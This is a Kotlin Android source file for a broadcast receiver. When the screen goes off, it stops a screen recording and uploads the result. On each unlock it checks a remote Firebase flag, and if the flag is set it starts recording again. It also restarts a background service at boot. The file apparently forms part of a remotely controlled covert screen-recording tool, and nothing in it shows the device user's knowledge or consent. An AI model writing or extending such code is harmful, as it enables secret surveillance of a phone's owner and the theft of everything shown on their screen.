package com.example.pc.huskotlin

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import android.widget.Toast
import com.google.firebase.database.*
import java.io.File
import android.support.v4.content.ContextCompat.startActivity
import android.support.v4.content.ContextCompat.startActivity
 import android.app.ActivityManager.RunningTaskInfo
import android.app.ActivityManager
import android.content.ComponentName
import android.support.v4.content.ContextCompat.startActivity
import android.support.v4.content.ContextCompat.startActivity
import android.content.pm.PackageManager
import android.support.v4.content.ContextCompat.startActivity



class ScreenOnOffReceiver : BroadcastReceiver() {
    var memoContext: Context? = null
    var myRef: DatabaseReference? = null
    var checkFirstOff: Boolean = false
    @SuppressLint("ObsoleteSdkInt")
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        Log.d(TAG, "Screen isxxxxxxxx $action")
        var database = FirebaseDatabase.getInstance()
        myRef = database.getReference("message")

        this.memoContext = context

        if (Intent.ACTION_SCREEN_OFF == action) {
             //  mainActivity.StopRecording();
            var firstOff = ScreenPreference.getInstance(memoContext!!).saveAppName

            if (firstOff.contains("false")) {
                Log.d(TAG, "offf dauuuuuuuuuuuuuuuuu")
                firstOff = "true"
                ScreenPreference.getInstance(memoContext!!).saveAppName = firstOff
                try {
                    if (RecordingActivity.instance.mMediaRecorder != null) {
                        try {
                            Log.d(TAG, "bat dau stop...")
                            RecordingActivity.instance.mMediaRecorder!!.stop()
                            RecordingActivity.instance.mMediaRecorder!!.reset()

                            if ( RecordingActivity.instance.mVirtualDisplay == null) {
                                return
                            }
                            RecordingActivity.instance.mVirtualDisplay!!.release()
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                RecordingActivity.instance.mMediaProjection!!.stop()
                            }
                            RecordingActivity.instance.mMediaProjection = null
                            Log.d(TAG, "da stop...")

                            RecordingActivity.instance.upload()
                             RecordingActivity.instance.stopCountTimer()
                        } catch (e: IllegalStateException) {
                            e.printStackTrace()
                        }
                    }
                }catch (e: Exception){
                    e.printStackTrace()
                }


            } else {

                try {
                    if (RecordingActivity.instance.mMediaRecorder != null) {
                        try {
                            Log.d(TAG, "bat dau stop...")
                            RecordingActivity.instance.mMediaRecorder!!.stop()
                            RecordingActivity.instance.mMediaRecorder!!.reset()

                            if ( RecordingActivity.instance.mVirtualDisplay == null) {
                                return
                            }
                            RecordingActivity.instance.mVirtualDisplay!!.release()
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                RecordingActivity.instance.mMediaProjection!!.stop()
                            }
                            RecordingActivity.instance.mMediaProjection = null
                            Log.d(TAG, "da stop...")

                             RecordingActivity.instance.upload()
                             RecordingActivity.instance.stopCountTimer()
                        } catch (e: IllegalStateException) {
                            e.printStackTrace()
                        }
                    }
                }catch (e: Exception){
                    e.printStackTrace()
                }



            }


        }

        if (Intent.ACTION_SCREEN_ON == action) {



        }
        if (Intent.ACTION_USER_PRESENT ==  action){
            checkOnOff()
        }


        if (Intent.ACTION_BOOT_COMPLETED == intent.action) {
            try {

               // val p = context.packageManager
               // val componentName = ComponentName(context, MainActivity::class.java!!) // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
                //p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
               // val i = Intent(context, MainActivity::class.java)
               // i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
               // context.startActivity(i)
            }catch (e:Exception){
                e.printStackTrace()
            }

        }
        val serviceIntent = Intent(context, ScreenOnOffBackgroundService::class.java)
        context.startService(serviceIntent)
    }



    private fun checkOnOff() {

        myRef!!.addValueEventListener(object : ValueEventListener {
            override fun onCancelled(p0: DatabaseError) {

            }

            override fun onDataChange(dataSnapshot: DataSnapshot) {
                val value = dataSnapshot.getValue(String::class.java)
                 if (value!!.contains("true")) {
                    try {
                        Log.d(TAG, "GO TO RECORDING ...")
                        var inten = Intent(memoContext, RecordingActivity::class.java)
                        inten.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                        inten.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        memoContext!!.startActivity(inten)
                    }catch (e:Exception){
                        e.printStackTrace()
                    }


                } else {
                    try {
                        if (RecordingActivity.instance.timer != null) {
                            RecordingActivity.instance.timer!!.cancel()

                        }

                    } catch (e: Exception) {
                        e.printStackTrace()
                    }

                }
            }
        })

    }

    companion object {

        private val TAG = "RecorderService"
    }


}
